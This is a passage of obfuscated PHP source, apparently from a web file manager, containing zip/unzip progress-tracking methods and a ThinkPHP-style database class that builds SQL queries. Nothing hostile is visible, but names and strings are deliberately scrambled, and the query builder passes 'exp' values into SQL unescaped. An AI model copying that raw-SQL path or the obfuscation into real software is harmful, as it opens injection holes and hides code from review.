$_SERVER[çâ¥×ø³]; parent::startAfter(); Hook::bind($ëïÜ‚»Î[1814], array($this, $ëïÜ‚»Î[1815])); Hook::bind($ëïÜ‚»Î[1246], array($this, $ëïÜ‚»Î[1816])); Hook::bind($ëïÜ‚»Î[1817], array($this, $ëïÜ‚»Î[1818])); $ûº¤àÙÁ =& $this->task; $ûº¤àÙÁ[$ëïÜ‚»Î[1819]] = $ëïÜ‚»Î[1247]; if (!$ûº¤àÙÁ[$ëïÜ‚»Î[1598]]) { $ûº¤àÙÁ[$ëïÜ‚»Î[1598]] = LNG($ëïÜ‚»Î[1820]); } } protected function endAfter() { $µãñªƒı =& $_SERVER[çâ¥×ø³]; parent::endAfter(); Hook::unbind($µãñªƒı[1814], array($this, $µãñªƒı[1815])); Hook::unbind($µãñªƒı[1246], array($this, $µãñªƒı[1816])); Hook::unbind($µãñªƒı[1817], array($this, $µãñªƒı[1818])); } public function updateAfter() { $‘ìµØá“ =& $_SERVER[çâ¥×ø³]; $•²ŠéÒ =& $this->task; if (!$•²ŠéÒ[$‘ìµØá“[835]] || !$•²ŠéÒ[$‘ìµØá“[812]]) { if ($•²ŠéÒ[$‘ìµØá“[1819]] != $‘ìµØá“[357]) { return; } } if ($•²ŠéÒ[$‘ìµØá“[1819]] == $‘ìµØá“[1247]) { $Ç€ëŞ„ = 0; if ($•²ŠéÒ[$‘ìµØá“[1754]]) { $Ç€ëŞ„ = $•²ŠéÒ[$‘ìµØá“[1755]] / $•²ŠéÒ[$‘ìµØá“[1754]]; } $•²ŠéÒ[$‘ìµØá“[1703]] = $Ç€ëŞ„ * 0.3; } else { if ($•²ŠéÒ[$‘ìµØá“[1819]] == $‘ìµØá“[357]) { $Ç€ëŞ„ = $•²ŠéÒ[$‘ìµØá“[1702]] / $•²ŠéÒ[$‘ìµØá“[835]]; $•²ŠéÒ[$‘ìµØá“[1703]] = 0.3 + $Ç€ëŞ„ * 0.4; } else { if ($•²ŠéÒ[$‘ìµØá“[1819]] == $‘ìµØá“[107]) { $¥€é†şş = 0; if ($•²ŠéÒ[$‘ìµØá“[1756]] == $‘ìµØá“[107]) { $¥€é†şş = $•²ŠéÒ[$‘ìµØá“[1755]]; } $Ç€ëŞ„ = ($•²ŠéÒ[$‘ìµØá“[1759]] + $¥€é†şş) / $•²ŠéÒ[$‘ìµØá“[812]]; $•²ŠéÒ[$‘ìµØá“[1703]] = 0.3 + 0.4 + $Ç€ëŞ„ * 0.3; } } } if ($•²ŠéÒ[$‘ìµØá“[1703]] > 0) { $İ–óš±Ğ = timeFloat() - $•²ŠéÒ[$‘ìµØá“[1705]] - $•²ŠéÒ[$‘ìµØá“[1708]]; $•²ŠéÒ[$‘ìµØá“[1709]] = $İ–óš±Ğ * (1 - $•²ŠéÒ[$‘ìµØá“[1703]]) / $•²ŠéÒ[$‘ìµØá“[1703]]; } } public function addFile($‹‚Ü©–ê) { $•û¹Á¹Á =& $_SERVER[çâ¥×ø³]; $±¢À÷ =& $this->task; $œ²¼Åñ = IO::info($‹‚Ü©–ê); $±¢À÷[$•û¹Á¹Á[1752]] = $œ²¼Åñ[$•û¹Á¹Á[32]]; $±¢À÷[$•û¹Á¹Á[1754]] = $œ²¼Åñ[$•û¹Á¹Á[76]]; $±¢À÷[$•û¹Á¹Á[1755]] = 0; $±¢À÷[$•û¹Á¹Á[1117]] = $•û¹Á¹Á[1775]; $±¢À÷[$•û¹Á¹Á[1756]] = $•û¹Á¹Á[1247]; $±¢À÷[$•û¹Á¹Á[812]] = $œ²¼Åñ[$•û¹Á¹Á[76]]; $±¢À÷[$•û¹Á¹Á[835]] = 1; $æ”ßßú² = 0; $±¢À÷[$•û¹Á¹Á[1763]] = array($•û¹Á¹Á[1764] => $æ”ßßú² + 1, $•û¹Á¹Á[462] => $œ²¼Åñ[$•û¹Á¹Á[32]], $•û¹Á¹Á[84] => $œ²¼Åñ[$•û¹Á¹Á[84]], $•û¹Á¹Á[551] => $œ²¼Åñ[$•û¹Á¹Á[551]] ? $œ²¼Åñ[$•û¹Á¹Á[551]] : $œ²¼Åñ[$•û¹Á¹Á[84]]); $this->update(); } public function zipEvent($ÁªÅ‘áÓ, $×è‚‡ïÅ, $ÚÙ‹«Í, $ø‡ğ¦×’) { $†÷ü‚‚Î =& $_SERVER[çâ¥×ø³]; $˜íĞù÷¼ =& $this->task; $˜íĞù÷¼[$†÷ü‚‚Î[1752]] = get_path_this($×è‚‡ïÅ); $˜íĞù÷¼[$†÷ü‚‚Î[1754]] = $ø‡ğ¦×’; $˜íĞù÷¼[$†÷ü‚‚Î[1755]] = $ÚÙ‹«Í; $˜íĞù÷¼[$†÷ü‚‚Î[1117]] = $ÁªÅ‘áÓ == $†÷ü‚‚Î[1821] ? $†÷ü‚‚Î[1822] : $†÷ü‚‚Î[1823]; $˜íĞù÷¼[$†÷ü‚‚Î[1756]] = $†÷ü‚‚Î[12]; $˜íĞù÷¼[$†÷ü‚‚Î[812]] = $ø‡ğ¦×’; $˜íĞù÷¼[$†÷ü‚‚Î[1819]] = $†÷ü‚‚Î[357]; $this->update(); } public function unzipAfter($˜ÙëŸ”¯) { $¸ë«‰Ó =& $_SERVER[çâ¥×ø³]; $šëÁÂ =& $this->task; $šëÁÂ[$¸ë«‰Ó[1819]] = $¸ë«‰Ó[107]; $Ê©ï¨ÄÓ = IO::infoWithChildren($˜ÙëŸ”¯); $»´Îç®å = 0; $šëÁÂ[$¸ë«‰Ó[1763]] = array($¸ë«‰Ó[1764] => $»´Îç®å + 1, $¸ë«‰Ó[462] => $Ê©ï¨ÄÓ[$¸ë«‰Ó[32]], $¸ë«‰Ó[84] => $Ê©ï¨ÄÓ[$¸ë«‰Ó[84]], $¸ë«‰Ó[551] => $Ê©ï¨ÄÓ[$¸ë«‰Ó[551]] ? $Ê©ï¨ÄÓ[$¸ë«‰Ó[551]] : $Ê©ï¨ÄÓ[$¸ë«‰Ó[84]]); if ($Ê©ï¨ÄÓ[$¸ë«‰Ó[33]] == $¸ë«‰Ó[214]) { $šëÁÂ[$¸ë«‰Ó[835]] = 1; } else { $šëÁÂ[$¸ë«‰Ó[835]] = $Ê©ï¨ÄÓ[$¸ë«‰Ó[79]][$¸ë«‰Ó[77]]; } $šëÁÂ[$¸ë«‰Ó[1117]] = $¸ë«‰Ó[12]; $šëÁÂ[$¸ë«‰Ó[1756]] = 0; $šëÁÂ[$¸ë«‰Ó[1702]] = 0; $šëÁÂ[$¸ë«‰Ó[1754]] = 0; $šëÁÂ[$¸ë«‰Ó[1755]] = 0; $šëÁÂ[$¸ë«‰Ó[1752]] = $¸ë«‰Ó[12]; $šëÁÂ[$¸ë«‰Ó[1759]] = 0; $šëÁÂ[$¸ë«‰Ó[812]] = $Ê©ï¨ÄÓ[$¸ë«‰Ó[76]]; $this->update(); self::log($¸ë«‰Ó[1824] . json_encode(array($šëÁÂ, $Ê©ï¨ÄÓ))); } public function nameParse($¬àè…ş„) { $ã¸ó¦…Ü =& $_SERVER[çâ¥×ø³]; $¢Ÿ¤óÔ¦ =& $this->task; if ($¢Ÿ¤óÔ¦[$ã¸ó¦…Ü[1819]] == $ã¸ó¦…Ü[1247]) { $¢Ÿ¤óÔ¦[$ã¸ó¦…Ü[1819]] = $ã¸ó¦…Ü[357]; $¢Ÿ¤óÔ¦[$ã¸ó¦…Ü[1759]] = 0; $¢Ÿ¤óÔ¦[$ã¸ó¦…Ü[812]] = 0; } $ìíüÖ¿ô = get_path_this($¬àè…ş„); if (strstr($ìíüÖ¿ô, $ã¸ó¦…Ü[10])) { $¢Ÿ¤óÔ¦[$ã¸ó¦…Ü[1702]] += 1; $¢Ÿ¤óÔ¦[$ã¸ó¦…Ü[835]] += 1; } $¢Ÿ¤óÔ¦[$ã¸ó¦…Ü[1752]] = $¬àè…ş„; $this->update(); } } goto f¤†Ñ·°À­; aéÅ‰¤È„é: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\150\x69\x6e\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\75", "\156\x65\161" => "\x3c\x3e", "\x67\164" => "\76", "\145\x67\164" => "\76\x3d", "\x6c\164" => "\x3c", "\x65\x6c\x74" => "\74\x3d", "\156\x6f\164\154\151\x6b\145" => "\116\117\x54\x20\x4c\x49\113\105", "\154\151\153\x65" => "\114\111\113\x45", "\151\x6e" => "\111\x4e", "\x6e\x6f\164\x69\156" => "\x4e\117\124\40\111\116", "\x6e\157\164\40\151\x6e" => "\x4e\117\x54\40\111\x4e", "\142\x65\164\x77\145\145\156" => "\x42\x45\124\x57\105\105\x4e", "\156\x6f\x74\142\x65\164\167\x65\x65\x6e" => "\x4e\117\x54\40\102\105\x54\x57\x45\105\x4e", "\156\x6f\x74\x20\x62\x65\164\x77\145\145\x6e" => "\x4e\117\124\x20\x42\x45\124\x57\x45\105\x4e"); protected $selectSql = "\123\x45\x4c\105\103\124\x25\x44\x49\x53\124\111\x4e\103\x54\45\x20\x25\x46\x49\105\114\x44\45\40\x46\122\x4f\115\x20\x25\124\101\x42\114\x45\45\x25\x4a\117\x49\x4e\45\x25\x57\110\x45\x52\x45\x25\x25\107\x52\117\125\120\x25\45\110\101\x56\111\x4e\x47\x25\45\117\122\104\x45\122\45\x25\x4c\x49\115\111\124\45\40\x25\125\x4e\x49\x4f\x4e\x25\45\x43\117\x4d\115\105\116\124\45"; protected $bind = array(); public static function getInstance() { $ü°Â”Ÿß = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[çâ¥×ø³][1013], $ü°Â”Ÿß); } public function factory($µ¯Åµ¹¤ = '') { $Àõ˜ŒÛ® =& $_SERVER[çâ¥×ø³]; $µ¯Åµ¹¤ = $this->parseConfig($µ¯Åµ¹¤); if (empty($µ¯Åµ¹¤[$Àõ˜ŒÛ®[1014]])) { think_exception(think_lang($Àõ˜ŒÛ®[1015])); } $this->dbType = ucwords(strtolower($µ¯Åµ¹¤[$Àõ˜ŒÛ®[1014]])); $ëÊÍ© = $Àõ˜ŒÛ®[1016] . $this->dbType; if (class_exists($ëÊÍ©)) { $‰ñÄŒ¥§ = new $ëÊÍ©($µ¯Åµ¹¤); if ($Àõ˜ŒÛ®[1017] != strtolower($µ¯Åµ¹¤[$Àõ˜ŒÛ®[1014]])) { $‰ñÄŒ¥§->dbType = strtoupper($this->dbType); } else { $‰ñÄŒ¥§->dbType = $this->_getDsnType($µ¯Åµ¹¤[$Àõ˜ŒÛ®[969]]); } } else { think_exception(think_lang($Àõ˜ŒÛ®[1018]) . $Àõ˜ŒÛ®[1019] . $ëÊÍ©); } return $‰ñÄŒ¥§; } public function __call($¢¬ıöª˜, $¨»œ°¼©) { if (method_exists($this, $¢¬ıöª˜)) { return call_user_func_array(array($this, $¢¬ıöª˜), $¨»œ°¼©); } } protected function _getDsnType($À¿çÚ°›) { $Šœ€Óá¿ = explode($_SERVER[çâ¥×ø³][4], $À¿çÚ°›); $Ù¯„÷è = strtoupper(trim($Šœ€Óá¿[0])); return $Ù¯„÷è; } private function parseConfig($ŞÒ“É = '') { $Ç ‡ù“• =& $_SERVER[çâ¥×ø³]; if (!empty($ŞÒ“É) && is_string($ŞÒ“É)) { $ŞÒ“É = $this->parseDSN($ŞÒ“É); } elseif (is_array($ŞÒ“É)) { $ŞÒ“É = array_change_key_case($ŞÒ“É); $ŞÒ“É = array($Ç ‡ù“•[1014] => $ŞÒ“É[$Ç ‡ù“•[1020]], $Ç ‡ù“•[941] => $ŞÒ“É[$Ç ‡ù“•[1021]], $Ç ‡ù“•[942] => $ŞÒ“É[$Ç ‡ù“•[1022]], $Ç ‡ù“•[939] => $ŞÒ“É[$Ç ‡ù“•[1023]], $Ç ‡ù“•[940] => $ŞÒ“É[$Ç ‡ù“•[1024]], $Ç ‡ù“•[21] => $ŞÒ“É[$Ç ‡ù“•[1025]], $Ç ‡ù“•[969] => $ŞÒ“É[$Ç ‡ù“•[1026]], $Ç ‡ù“•[17] => isset($ŞÒ“É[$Ç ‡ù“•[1027]]) ? $ŞÒ“É[$Ç ‡ù“•[1027]] : array()); } elseif (empty($ŞÒ“É)) { if (think_config($Ç ‡ù“•[1028]) && $Ç ‡ù“•[1017] != strtolower(think_config($Ç ‡ù“•[1029]))) { $ŞÒ“É = $this->parseDSN(think_config($Ç ‡ù“•[1028])); } else { $ŞÒ“É = array($Ç ‡ù“•[1014] => think_config($Ç ‡ù“•[1029]), $Ç ‡ù“•[941] => think_config($Ç ‡ù“•[1030]), $Ç ‡ù“•[942] => think_config($Ç ‡ù“•[1031]), $Ç ‡ù“•[939] => think_config($Ç ‡ù“•[1032]), $Ç ‡ù“•[940] => think_config($Ç ‡ù“•[1033]), $Ç ‡ù“•[21] => think_config($Ç ‡ù“•[290]), $Ç ‡ù“•[969] => think_config($Ç ‡ù“•[1028]), $Ç ‡ù“•[17] => think_config($Ç ‡ù“•[1034])); } } return $ŞÒ“É; } protected function initConnect($æëà¸ÅË = true) { if (1 == think_config($_SERVER[çâ¥×ø³][22])) { $this->_linkID = $this->multiConnect($æëà¸ÅË); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $ú«áàĞ” => $ÜÅï†Û) { $this->_linkID = $ÜÅï†Û; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($ôĞ‰îïÛ = false) { $Ë¸Ä‚Üô =& $_SERVER[çâ¥×ø³]; static $à¿´Ú½ = array(); static $Íœ‘Ï”ô = -1; if (empty($à¿´Ú½)) { foreach ($this->config as $äÖ­ÂéÎ => $š©ÖºÑ) { $à¿´Ú½[$äÖ­ÂéÎ] = explode($Ë¸Ä‚Üô[50], $š©ÖºÑ); } } if (think_config($Ë¸Ä‚Üô[1035])) { if ($ôĞ‰îïÛ || think_config($Ë¸Ä‚Üô[439]) === !0) { $‹Üïµ = floor(mt_rand(0, think_config($Ë¸Ä‚Üô[1036]) - 1)); $Íœ‘Ï”ô = $‹Üïµ; } else { if (is_numeric(think_config($Ë¸Ä‚Üô[1037]))) { $‹Üïµ = think_config($Ë¸Ä‚Üô[1037]); } else { $‹Üïµ = floor(mt_rand(think_config($Ë¸Ä‚Üô[1036]), count($à¿´Ú½[$Ë¸Ä‚Üô[939]]) - 1)); } } } else { $‹Üïµ = floor(mt_rand(0, count($à¿´Ú½[$Ë¸Ä‚Üô[939]]) - 1)); $Íœ‘Ï”ô = $‹Üïµ; } $‹Üïµ = $Íœ‘Ï”ô !== -1 ? $Íœ‘Ï”ô : $‹Üïµ; $‘ú»‹§® = array($Ë¸Ä‚Üô[941] => isset($à¿´Ú½[$Ë¸Ä‚Üô[941]][$‹Üïµ]) ? $à¿´Ú½[$Ë¸Ä‚Üô[941]][$‹Üïµ] : $à¿´Ú½[$Ë¸Ä‚Üô[941]][0], $Ë¸Ä‚Üô[942] => isset($à¿´Ú½[$Ë¸Ä‚Üô[942]][$‹Üïµ]) ? $à¿´Ú½[$Ë¸Ä‚Üô[942]][$‹Üïµ] : $à¿´Ú½[$Ë¸Ä‚Üô[942]][0], $Ë¸Ä‚Üô[939] => isset($à¿´Ú½[$Ë¸Ä‚Üô[939]][$‹Üïµ]) ? $à¿´Ú½[$Ë¸Ä‚Üô[939]][$‹Üïµ] : $à¿´Ú½[$Ë¸Ä‚Üô[939]][0], $Ë¸Ä‚Üô[940] => isset($à¿´Ú½[$Ë¸Ä‚Üô[940]][$‹Üïµ]) ? $à¿´Ú½[$Ë¸Ä‚Üô[940]][$‹Üïµ] : $à¿´Ú½[$Ë¸Ä‚Üô[940]][0], $Ë¸Ä‚Üô[21] => isset($à¿´Ú½[$Ë¸Ä‚Üô[21]][$‹Üïµ]) ? $à¿´Ú½[$Ë¸Ä‚Üô[21]][$‹Üïµ] : $à¿´Ú½[$Ë¸Ä‚Üô[21]][0], $Ë¸Ä‚Üô[969] => isset($à¿´Ú½[$Ë¸Ä‚Üô[969]][$‹Üïµ]) ? $à¿´Ú½[$Ë¸Ä‚Üô[969]][$‹Üïµ] : $à¿´Ú½[$Ë¸Ä‚Üô[969]][0], $Ë¸Ä‚Üô[17] => isset($à¿´Ú½[$Ë¸Ä‚Üô[17]][$‹Üïµ]) ? $à¿´Ú½[$Ë¸Ä‚Üô[17]][$‹Üïµ] : $à¿´Ú½[$Ë¸Ä‚Üô[17]][0]); return $this->connect($‘ú»‹§®, $‹Üïµ); } public function parseDSN($Û˜üÕ­Ç) { $ºşƒ =& $_SERVER[çâ¥×ø³]; if (empty($Û˜üÕ­Ç)) { return !1; } $¸Òî¡è’ = parse_url($Û˜üÕ­Ç); if ($¸Òî¡è’[$ºşƒ[195]]) { $èú…ÒëŒ = array($ºşƒ[1014] => $¸Òî¡è’[$ºşƒ[195]], $ºşƒ[941] => isset($¸Òî¡è’[$ºşƒ[630]]) ? $¸Òî¡è’[$ºşƒ[630]] : $ºşƒ[12], $ºşƒ[942] => isset($¸Òî¡è’[$ºşƒ[1038]]) ? $¸Òî¡è’[$ºşƒ[1038]] : $ºşƒ[12], $ºşƒ[939] => isset($¸Òî¡è’[$ºşƒ[196]]) ? $¸Òî¡è’[$ºşƒ[196]] : $ºşƒ[12], $ºşƒ[940] => isset($¸Òî¡è’[$ºşƒ[197]]) ? $¸Òî¡è’[$ºşƒ[197]] : $ºşƒ[12], $ºşƒ[21] => isset($¸Òî¡è’[$ºşƒ[84]]) ? substr($¸Òî¡è’[$ºşƒ[84]], 1) : $ºşƒ[12]); } else { preg_match($ºşƒ[1039], trim($Û˜üÕ­Ç), $ëì²¾¤); $èú…ÒëŒ = array($ºşƒ[1014] => $ëì²¾¤[1], $ºşƒ[941] => $ëì²¾¤[2], $ºşƒ[942] => $ëì²¾¤[3], $ºşƒ[939] => $ëì²¾¤[4], $ºşƒ[940] => $ëì²¾¤[5], $ºşƒ[21] => $ëì²¾¤[6]); } $èú…ÒëŒ[$ºşƒ[969]] = $ºşƒ[12]; return $èú…ÒëŒ; } protected function debug() { $õ´ñ®à =& $_SERVER[çâ¥×ø³]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $õ´ñ®à[1040]; if (think_config($õ´ñ®à[1041])) { think_status($õ´ñ®à[1042]); think_trace($this->queryStr . $õ´ñ®à[1043] . think_status($õ´ñ®à[24], $õ´ñ®à[1042], 6) . $õ´ñ®à[1044], $õ´ñ®à[12], $õ´ñ®à[1045]); } } protected function parseLock($Æœ¡Áë› = false) { $Øû²„’Ú =& $_SERVER[çâ¥×ø³]; if (!$Æœ¡Áë›) { return $Øû²„’Ú[12]; } if ($Øû²„’Ú[971] == $this->dbType) { return $Øû²„’Ú[1046]; } return $Øû²„’Ú[1047]; } protected function parseSet($¨îÁÆ¿¹) { $èñİ˜Çœ =& $_SERVER[çâ¥×ø³]; foreach ($¨îÁÆ¿¹ as $Ä¼É¶½ => $‰âË’) { if (is_array($‰âË’) && $èñİ˜Çœ[341] == $‰âË’[0]) { $ÌÛßíŸ[] = $this->parseKey($Ä¼É¶½) . $èñİ˜Çœ[937] . $‰âË’[1]; } elseif (is_scalar($‰âË’) || is_null($‰âË’)) { $ÌÛßíŸ[] = $this->parseKey($Ä¼É¶½) . $èñİ˜Çœ[937] . $this->parseValue($‰âË’); } } return $èñİ˜Çœ[1048] . implode($èñİ˜Çœ[50], $ÌÛßíŸ); } protected function bindParam($´šÀ³‚‚, $Ï©¢è”Ä) { $this->bind[$_SERVER[çâ¥×ø³][4] . $´šÀ³‚‚] = $Ï©¢è”Ä; } protected function parseBind($àşåŞË) { $àşåŞË = array_merge($this->bind, $àşåŞË); $this->bind = array(); return $àşåŞË; } function parseKey(&$Ó¿™¾†, $Û×ïã¯Ô = true) { if ($Û×ïã¯Ô) { $Ó¿™¾† = $this->parseKeyCheck($Ó¿™¾†); } return $Ó¿™¾†; } function parseKeyCheck($æ¶õñ±) { $Ñ‰ŞØËÚ =& $_SERVER[çâ¥×ø³]; $æ¶õñ± = trim($æ¶õñ±); if (!preg_match($Ñ‰ŞØËÚ[1049], $æ¶õñ±)) { think_exception($Ñ‰ŞØËÚ[1050] . $æ¶õñ±); } return $æ¶õñ±; } protected function parseValue($Š®ÑÒ¹Õ) { $§ƒºÆ’² =& $_SERVER[çâ¥×ø³]; if (is_string($Š®ÑÒ¹Õ)) { $Š®ÑÒ¹Õ = $§ƒºÆ’²[1010] . $this->escapeString($Š®ÑÒ¹Õ) . $§ƒºÆ’²[1010]; } elseif (isset($Š®ÑÒ¹Õ[0]) && is_string($Š®ÑÒ¹Õ[0]) && strtolower($Š®ÑÒ¹Õ[0]) == $§ƒºÆ’²[341]) { $Š®ÑÒ¹Õ = $this->escapeString($Š®ÑÒ¹Õ[1]); } elseif (is_array($Š®ÑÒ¹Õ)) { $Š®ÑÒ¹Õ = array_map(array($this, $§ƒºÆ’²[1011]), $Š®ÑÒ¹Õ); } elseif (is_bool($Š®ÑÒ¹Õ)) { $Š®ÑÒ¹Õ = $Š®ÑÒ¹Õ ? $§ƒºÆ’²[88] : $§ƒºÆ’²[212]; } elseif (is_null($Š®ÑÒ¹Õ)) { $Š®ÑÒ¹Õ = $§ƒºÆ’²[103]; } return $Š®ÑÒ¹Õ; } protected function parseField($ ›ûÚ§‘) { $õúêñœ =& $_SERVER[çâ¥×ø³]; if (is_string($ ›ûÚ§‘) && strpos($ ›ûÚ§‘, $õúêñœ[50])) { $ ›ûÚ§‘ = explode($õúêñœ[50], $ ›ûÚ§‘); } if (is_array($ ›ûÚ§‘)) { $È˜Ÿ‘µÆ = array(); foreach ($ ›ûÚ§‘ as $“¬Áˆ¢ => $Š–¥ò×ú) { if (!is_numeric($“¬Áˆ¢)) { $È˜Ÿ‘µÆ[] = $this->parseKey($“¬Áˆ¢, !1) . $õúêñœ[1051] . $this->parseKey($Š–¥ò×ú); } else { $È˜Ÿ‘µÆ[] = $this->parseKey($Š–¥ò×ú); } } $œ“Ğù£ = implode($õúêñœ[50], $È˜Ÿ‘µÆ); } elseif (is_string($ ›ûÚ§‘) && !empty($ ›ûÚ§‘)) { $œ“Ğù£ = $ ›ûÚ§‘; } else { $œ“Ğù£ = $õúêñœ[203]; } return $œ“Ğù£; } protected function parseTable($©º÷ğà) { $Î¥ØÃÕ =& $_SERVER[çâ¥×ø³]; if (is_array($©º÷ğà)) { $ãÍ¡’£™ = array(); foreach ($©º÷ğà as $æ“Ğßë => $ÖÈÜÂß›) { if (!is_numeric($æ“Ğßë)) { $ãÍ¡’£™[] = $this->parseKey($æ“Ğßë) . $Î¥ØÃÕ[53] . $this->parseKey($ÖÈÜÂß›); } else { $ãÍ¡’£™[] = $this->parseKey($æ“Ğßë); } } $©º÷ğà = $ãÍ¡’£™; } elseif (is_string($©º÷ğà)) { if (strstr($©º÷ğà, $Î¥ØÃÕ[53])) { return $©º÷ğà; } $©º÷ğà = explode($Î¥ØÃÕ[50], $©º÷ğà); array_walk($©º÷ğà, array($this, $Î¥ØÃÕ[959])); } return $Î¥ØÃÕ[953] . trim(implode($Î¥ØÃÕ[1052], $©º÷ğà), $Î¥ØÃÕ[429]) . $Î¥ØÃÕ[953]; } protected function parseWhere($•Ò»Ê¢) { $‚öŸšÂ =& $_SERVER[çâ¥×ø³]; $ÎšƒÆê = $‚öŸšÂ[12]; if (is_string($•Ò»Ê¢)) { $ÎšƒÆê = $•Ò»Ê¢; } else { $¼ê¦·üë = isset($•Ò»Ê¢[$‚öŸšÂ[1053]]) ? strtoupper($•Ò»Ê¢[$‚öŸšÂ[1053]]) : $‚öŸšÂ[12]; if (in_array($¼ê¦·üë, array($‚öŸšÂ[1054], $‚öŸšÂ[1055], $‚öŸšÂ[1056]))) { $¼ê¦·üë = $‚öŸšÂ[53] . $¼ê¦·üë . $‚öŸšÂ[53]; unset($•Ò»Ê¢[$‚öŸšÂ[1053]]); } else { $¼ê¦·üë = $‚öŸšÂ[1057]; } foreach ($•Ò»Ê¢ as $¯ç¥õà® => $••Ğª¡£) { $ÎšƒÆê .= $‚öŸšÂ[321]; if (is_numeric($¯ç¥õà®)) { $¯ç¥õà® = $‚öŸšÂ[1058]; } if (0 === strpos($¯ç¥õà®, $‚öŸšÂ[11])) { $ÎšƒÆê .= $this->parseThinkWhere($¯ç¥õà®, $••Ğª¡£); } else { if (!preg_match($‚öŸšÂ[1059], trim($¯ç¥õà®))) { think_exception(think_lang($‚öŸšÂ[1060]) . $‚öŸšÂ[4] . $¯ç¥õà®); } $öğß×³– = is_array($••Ğª¡£) && isset($••Ğª¡£[$‚öŸšÂ[1061]]); $¯ç¥õà® = trim($¯ç¥õà®); if (strpos($¯ç¥õà®, $‚öŸšÂ[327])) { $Ä»¹Òş÷ = explode($‚öŸšÂ[327], $¯ç¥õà®); $ûâ¬¬ìì = array(); foreach ($Ä»¹Òş÷ as $›‘îĞÇ‘ => $ÌâÕèîæ) { $˜÷À«Ó¸ = $öğß×³– ? $••Ğª¡£[$›‘îĞÇ‘] : $••Ğª¡£; $ûâ¬¬ìì[] = $‚öŸšÂ[304] . $this->parseWhereItem($this->parseKey($ÌâÕèîæ), $˜÷À«Ó¸) . $‚öŸšÂ[958]; } $ÎšƒÆê .= implode($‚öŸšÂ[1062], $ûâ¬¬ìì); } elseif (strpos($¯ç¥õà®, $‚öŸšÂ[328])) { $Ä»¹Òş÷ = explode($‚öŸšÂ[328], $¯ç¥õà®); $ûâ¬¬ìì = array(); foreach ($Ä»¹Òş÷ as $›‘îĞÇ‘ => $ÌâÕèîæ) { $˜÷À«Ó¸ = $öğß×³– ? $••Ğª¡£[$›‘îĞÇ‘] : $••Ğª¡£; $ûâ¬¬ìì[] = $‚öŸšÂ[304] . $this->parseWhereItem($this->parseKey($ÌâÕèîæ), $˜÷À«Ó¸) . $‚öŸšÂ[958]; } $ÎšƒÆê .= implode($‚öŸšÂ[1057], $ûâ¬¬ìì); } else { $ÎšƒÆê .= $this->parseWhereItem($this->parseKey($¯ç¥õà®), $••Ğª¡£); } } $ÎšƒÆê .= $‚öŸšÂ[322] . $¼ê¦·üë; } $ÎšƒÆê = substr($ÎšƒÆê, 0, -strlen($¼ê¦·üë)); } return empty($ÎšƒÆê) ? $‚öŸšÂ[12] : $‚öŸšÂ[1063] . $ÎšƒÆê; } protected function parseWhereItem($©ûƒÖ±˜, $×ÇŸÔ°) { $ê­âÀÌ =& $_SERVER[çâ¥×ø³]; $é†°¬Óù = $ê­âÀÌ[12]; if (is_array($×ÇŸÔ°)) { if (is_string($×ÇŸÔ°[0])) { $…æŠú¿ = strtolower($×ÇŸÔ°[0]); if (in_array($×ÇŸÔ°[0], array($ê­âÀÌ[937], $ê­âÀÌ[1064], $ê­âÀÌ[1065], $ê­âÀÌ[1066], $ê­âÀÌ[1067], $ê­âÀÌ[1068]))) { $é†°¬Óù .= $©ûƒÖ±˜ . $ê­âÀÌ[53] . $×ÇŸÔ°[0] . $ê­âÀÌ[53] . $this->parseValue($×ÇŸÔ°[1]); } elseif (preg_match($ê­âÀÌ[1069], $×ÇŸÔ°[0])) { $é†°¬Óù .= $©ûƒÖ±˜ . $ê­âÀÌ[53] . $this->exp[$…æŠú¿] . $ê­âÀÌ[53] . $this->parseValue($×ÇŸÔ°[1]); } elseif (preg_match($ê­âÀÌ[1070], $×ÇŸÔ°[0])) { if (is_array($×ÇŸÔ°[1])) { $˜Åúßö = isset($×ÇŸÔ°[2]) ? strtoupper($×ÇŸÔ°[2]) : $ê­âÀÌ[1055]; if (in_array($˜Åúßö, array($ê­âÀÌ[1054], $ê­âÀÌ[1055], $ê­âÀÌ[1056]))) { $»Ï®ğíâ = array(); foreach ($×ÇŸÔ°[1] as $Î”Ÿ—‹œ) { $»Ï®ğíâ[] = $©ûƒÖ±˜ . $ê­âÀÌ[53] . $this->exp[$…æŠú¿] . $ê­âÀÌ[53] . $this->parseValue($Î”Ÿ—‹œ); } $é†°¬Óù .= $ê­âÀÌ[304] . implode($ê­âÀÌ[53] . $˜Åúßö . $ê­âÀÌ[53], $»Ï®ğíâ) . $ê­âÀÌ[958]; } } else { $é†°¬Óù .= $©ûƒÖ±˜ . $ê­âÀÌ[53] . $this->exp[$…æŠú¿] . $ê­âÀÌ[53] . $this->parseValue($×ÇŸÔ°[1]); } } elseif ($ê­âÀÌ[341] == $…æŠú¿) { $é†°¬Óù .= $ê­âÀÌ[956] . $©ûƒÖ±˜ . $ê­âÀÌ[53] . $×ÇŸÔ°[1] . $ê­âÀÌ[1071]; } elseif (preg_match($ê­âÀÌ[1072], $×ÇŸÔ°[0])) { $é†°¬Óù .= $×ÇŸÔ°[0]; } elseif (preg_match($ê­âÀÌ[1073], $×ÇŸÔ°[0])) { if (isset($×ÇŸÔ°[2]) && $ê­âÀÌ[341] == $×ÇŸÔ°[2]) { $é†°¬Óù .= $©ûƒÖ±˜ . $ê­âÀÌ[53] . $this->exp[$…æŠú¿] . $ê­âÀÌ[53] . $×ÇŸÔ°[1]; } else { if (is_string($×ÇŸÔ°[1])) { $×ÇŸÔ°[1] = explode($ê­âÀÌ[50], $×ÇŸÔ°[1]); } $·ñˆ®§ = implode($ê­âÀÌ[50], $this->parseValue($×ÇŸÔ°[1])); $é†°¬Óù .= $©ûƒÖ±˜ . $ê­âÀÌ[53] . $this->exp[$…æŠú¿] . $ê­âÀÌ[956] . $·ñˆ®§ . $ê­âÀÌ[958]; } } elseif (preg_match($ê­âÀÌ[1074], 